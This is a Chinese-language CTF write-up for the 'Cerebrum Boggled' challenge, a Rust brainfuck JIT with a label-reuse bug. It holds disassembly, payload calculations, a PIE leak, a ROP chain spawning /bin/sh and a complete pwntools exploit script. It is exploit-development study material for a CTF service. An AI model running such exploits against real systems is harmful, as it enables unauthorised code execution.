---
date: 2022-04-15 19:43:36
challenge: Cerebrum Boggled
tags:
  - brainfuck
  - jit
---

## 题目分析

`rust`程序，提供了源码，实现了一个`brainfuck`的`jit`

与之前见过的`brainfuck`类型题目不同的是，这道题的`generate_jit`函数中没有找到越界等漏洞，程序的主要问题其实在主函数提供的`while result.is_err()`中:

- 重新进行`generate_forward_labels`前后，上次生成的`backward_labels`并没有被清除

做`pwn`的过程主要就是扩大自己对程序控制范围的过程，因此考虑通过:

- `nop`填充偏移
- 先后传入`[`与`]`控制跳转
- `,`与`.`末尾的大量`pop`语句

三者结合，控制`rcx`寄存器，将其劫持到`&ret_addr`附近，进而控制`ret_addr`进行`rop`.

---

## 漏洞利用

结合`gdb`进行下列分析和尝试:

首先设置`payload = b"+[><,.__]"`进行测试，将汇编语句与`jit`中提供的功能对应，计算偏移:

```c++
// starting	0xe
0x000:      push   rbx
0x001:      movabs rcx,0x7ffd0f9a32c8
0x00b:      xor    rbx,rbx

// '+'		0x3
0x00e:      inc    BYTE PTR [rcx+rbx*1]

// '['		0xa
0x011:      cmp    BYTE PTR [rcx+rbx*1],0x0
0x015:      je     0x7f2f2f54b09d

// '>'		0x1d
0x01b:      inc    rbx
0x01e:      movabs rdx,0x1000
0x028:      cmp    rbx,rdx
0x02b:      jl     0x7f2f2f54b038
0x031:      mov    al,0x1
0x033:      jmp    0x7f2f2f54b09f

// '<'		0x17
0x038:      dec    rbx
0x03b:      cmp    rbx,0x0
0x042:      jge    0x7f2f2f54b04f
0x048:      mov    al,0x2
0x04a:      jmp    0x7f2f2f54b09f

// ','		0x1d
0x04f:      push   rax
0x050:      push   rcx
0x051:      push   rdx
0x052:      push   rdi
0x053:      push   rsi
0x054:      xor    rax,rax
0x057:      xor    rdi,rdi
0x05a:      lea    rsi,[rcx+rbx*1]
0x05e:      mov    rdx,0x1
0x065:      syscall
0x067:      pop    rsi
0x068:      pop    rdi
0x069:      pop    rdx
0x06a:      pop    rcx
0x06b:      pop    rax

// '.'		0x25
0x06c:      push   rax
0x06d:      push   rcx
0x06e:      push   rdx
0x06f:      push   rdi
0x070:      push   rsi
0x071:      mov    rax,0x1
0x078:      mov    rdi,0x1
0x07f:      lea    rsi,[rcx+rbx*1]
0x083:      mov    rdx,0x1
0x08a:      syscall
0x08c:      pop    rsi
0x08d:      pop    rdi
0x08e:      pop    rdx
0x08f:      pop    rcx
0x090:      pop    rax

// nop		0x1
0x091:      nop
0x092:      nop

// ']'		0xa
0x093:      cmp    BYTE PTR [rcx+rbx*1],0x0
0x097:      jne    0x7f2f2f54b01b

0x09d:      mov    al,0x0
0x09f:      pop    rbx
0x0a0:      ret
```

对应的汇编指令长度计算:

```py
def calcLen(payload):
	initSum = 0
	for i in payload.decode():
		if 	 i == '[' or i == ']':
			initSum += 0xa
		elif i == '+' or i == '-':
			initSum += 0x3
		elif i == '>' or i == ',':
			initSum += 0x1d
		elif i == '<':
			initSum += 0x17
		elif i == '.':
			initSum += 0x25
		else:
			initSum += 0x1
	return initSum
```

---

### 控制`rax`, `rcx`寄存器

通过以上分析，就可以构造`pop rax`的循环( 程序会在`]`处进行条件跳转，目标是与之对应的`[`结束的位置，故把`payload`分为两段先后送入程序 ):

**值得注意的是，若`payload1`中`[`所对应的跳转地址比`calcLen(payload1)`大，则`rust`会报错**

```
// payload1:
0x00e 		'_' * 0x12
0x020 		'['
0x02a 		(pop rax)

// payload2:
0x00e 		','
0x02b 		','
0x048 		']' -> 0x02a_pop_rax
```

即:

```py
payload1 = b'_'*0x12 + b'['
payload2 = b',,]'
payload1 = payload1.ljust(calcLen(payload2), b'_')
```

测试发现成功控制`rax`;

在此基础上构造循环`pop rcx; pop rax;`:

```
// payload2 = b',,,],]'
// payload1:
0x00e 		'_' * 0x11
0x01f 		'['
0x029 		'_' * 0x14
0x03d 		'['
0x047 		(pop_rcx_rax)

// payload2:
0x00e 		','
0x02b 		','
0x048 		','
0x065		']' -> 0x029_pop_rax
0x06f 		','
0x08c 		']' -> 0x047_pop_rcx_rax
```

---

### 泄露`PIE`偏移

程序实现的`jit`中将`rcx`用于定位写入的地址，一开始的想法是将`rcx`劫持到一块可写可执行的内存区域进行`ret2shellcode`，但是程序中并没有找到合适的空间，同时程序的`plt`表上什么也没有，就只能考虑更麻烦的`ROP`，由于`PIE`的存在，第一步自然是泄露`elf`基址:

调试发现`rcx`附近有几个特别的地址，它们末尾几位总是`430`，相对于`elf_base`是固定的且`offset=0x10430`，就可以借助`brainfuck`中`.`逐字节泄露:

```py
payload2 += b'[>.,],'
# previous_exploit
for i in range(7):
	sn(b'a')
	rn(1)
for i in range(11):
	leak_addr = b''
	for i in range(8):
		sn(b'a')
		leak_addr += rn(1)
	leak_addr = uu64(leak_addr)
	lg("leak_addr")
lg("leak_addr")
elf_base = leak_addr - 0x10430
```

这样就可以通过偏移来构造`ROP`了.

---

但是刚刚泄露时循环`>`修改了`rbx`，因此通过`b'[<,],'`将`rbx`归零:

```py
payload2 += b'[<,],'
# previous_exploit
sn(b'\x00')
for i in range(0x5f):
	sn(b'a')
sn(b'\x00')
```

---

### ROP

进一步调试，发现程序最后`ret_addr`距离`rcx`还有一段偏移，因此考虑再最初多`pop`几次`rax`:

```py
# previous
for i in range((0x7ffe79705030-0x7ffe79704e90) // 8):
	sn(b'a')
```

---

接下来就是`ROP`利用了:

```py
def ROP(base):
	pop_rdi_ret = 0x711d + base
	mov_rdx_rdi_ret = 0x103F2 + base
	pop_rsi_ret = 0x7285 + base
	pop_rax_ret = 0x10143 + base
	syscall = 0x10847 + base
	buffer = 0x62078 + base
	or_rax_rcx_ret = 0x41a73 + base
	magic1 = 0x40512 + base
	magic2 = 0x404ba + base
	payload = p64(0) # pop rbx
	payload += p64(pop_rax_ret) + p64(0) # ret
	payload += p64(or_rax_rcx_ret)
	payload += p64(pop_rsi_ret) + p64(0xC0)
	payload += p64(pop_rdi_ret) + p64(buffer - 0x18)
	payload += p64(magic1) # [buffer] = rcx + 0xC0

	payload += p64(pop_rdi_ret) + p64(0)
	payload += p64(mov_rdx_rdi_ret) # rdx = 0
	payload += p64(pop_rsi_ret) + p64(0) # rsi = 0
	payload += p64(pop_rdi_ret) + p64(buffer - 8)
	payload += p64(magic2) + p64(0) # rdi = [buffer] = rcx + 0xC0
	payload += p64(pop_rax_ret) + p64(59) # rax = 59
	payload += p64(syscall)
	payload += b'/bin/sh\x00' * 10
	for i in payload:
		sn(p8(i) + b'a')
	sn(b'\x00'*2)
```

---

## exp.py

```py
#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "cha.hackpack.club 20994"
remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    lg("p.pid")
    input()
def sendPayload(payload):
	ru(b'program length: ')
	sl(str(len(payload)).encode())
	ru(b'program source: ')
	sn(payload)
def calcLen(payload):
	initSum = 0
	for i in payload.decode():
		if 	 i == '[' or i == ']':
			initSum += 0xa
		elif i == '+' or i == '-':
			initSum += 0x3
		elif i == '>' or i == ',':
			initSum += 0x1d
		elif i == '<':
			initSum += 0x17
		elif i == '.':
			initSum += 0x25
		else:
			initSum += 0x1
	return initSum

def ROP(base):
	pop_rdi_ret = 0x711d + base
	mov_rdx_rdi_ret = 0x103F2 + base
	pop_rsi_ret = 0x7285 + base
	pop_rax_ret = 0x10143 + base
	syscall = 0x10847 + base
	buffer = 0x62078 + base
	or_rax_rcx_ret = 0x41a73 + base
	magic1 = 0x40512 + base
	magic2 = 0x404ba + base
	payload = p64(0) # pop rbx
	payload += p64(pop_rax_ret) + p64(0) # ret
	payload += p64(or_rax_rcx_ret)
	payload += p64(pop_rsi_ret) + p64(0xC0)
	payload += p64(pop_rdi_ret) + p64(buffer - 0x18)
	payload += p64(magic1) # [buffer] = rcx + 0xC0

	payload += p64(pop_rdi_ret) + p64(0)
	payload += p64(mov_rdx_rdi_ret) # rdx = 0
	payload += p64(pop_rsi_ret) + p64(0) # rsi = 0
	payload += p64(pop_rdi_ret) + p64(buffer - 8)
	payload += p64(magic2) + p64(0) # rdi = [buffer] = rcx + 0xC0
	payload += p64(pop_rax_ret) + p64(59) # rax = 59
	payload += p64(syscall)
	payload += b'/bin/sh\x00' * 10
	for i in payload:
		sn(p8(i) + b'a')
	sn(b'\x00'*2)

payload1 = b'_'*0x11 + b'[' + b'_'*0x14 + b'['
payload2 = b',,,],],' + b'[>.,],' + b'[<,],' + b'[,>,],'
payload1 = payload1.ljust(calcLen(payload2), b'_')

sendPayload(payload1)
sendPayload(payload2)

sn(b'a'*2)
for i in range(4):
	sn(b'a')
sn(b'\x00')

sn(b'a')
sn(b'\x00')

######
# lifting rsp to adjust it to rcx in the end
for i in range((0x7ffe79705030-0x7ffe79704e90) // 8):
	sn(b'a')
######

sn(b'\x00')
sn(b'\x00')

for i in range(7):
	sn(b'a')
	rn(1)
for i in range(11):
	leak_addr = b''
	for i in range(8):
		sn(b'a')
		leak_addr += rn(1)
	leak_addr = uu64(leak_addr)
	lg("leak_addr")
lg("leak_addr")
elf_base = leak_addr - 0x10430

sn(b'\x00')
for i in range(0x5f):
	sn(b'a')
sn(b'\x00')

debugPID()
sn(b'a')
ROP(elf_base)

irt()
```

